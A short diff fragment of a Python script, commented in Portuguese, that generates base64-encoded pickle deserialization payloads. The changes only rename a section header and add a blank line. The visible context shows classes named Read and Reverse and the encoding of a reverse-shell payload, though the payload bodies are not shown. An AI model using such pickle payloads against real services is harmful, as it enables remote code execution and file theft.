@@ -8,7 +8,7 @@ print("=" * 60)
 print()
 
 # Ler arquivo
-print("[1] Payload para curl")
+print("[1] Payload para ler arquivo")
 print("-" * 60)
 
 class Read:
@@ -43,3 +43,4 @@ class Reverse:
 payload3 = base64.b64encode(pickle.dumps(Reverse())).decode()
 print(payload3)
 print()
+
